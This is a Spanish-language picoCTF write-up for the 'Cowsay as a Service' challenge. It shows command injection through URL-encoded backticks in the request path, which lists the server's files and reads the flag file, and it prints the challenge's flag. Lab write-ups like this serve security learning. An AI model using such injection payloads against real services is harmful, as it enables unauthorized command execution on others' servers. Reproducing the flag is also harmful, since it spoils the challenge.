## Objetivo
## Solución
- ##### Al entrar al sitio, nos dice lo siguiente:
```
Cowsay as a Service

Make a request to the following URL to cowsay your message: 
https://caas.mars.picoctf.net/cowsay/{message}
```

- ##### Por lo que podemos hacer que la vaca diga lo que quiera.
```
 _______________
< Seguridad GOD >
 ---------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

- ##### Haremos exploits para descubrir la bandera.
```
https://caas.mars.picoctf.net/cowsay/%60ls%60
 __________________________________
/ Dockerfile falg.txt index.js     \
| node_modules package.json public |
\ yarn.lock                        /
 ----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

https://caas.mars.picoctf.net/cowsay/%60cat%20falg.txt%60
 _________________________________________
/ picoCTF{moooooooooooooooooooooooooooooo \
\ oooooooooooooooooooooooooooooo0o}       /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

- ##### Una vez hecho que la vaca nos dijera el contenido del archivo "falg.txt", obtenemos la bandera.
```
Flag: picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```
## Notas Adicionales
## Referencias
- [PicoCTF](https://play.picoctf.org)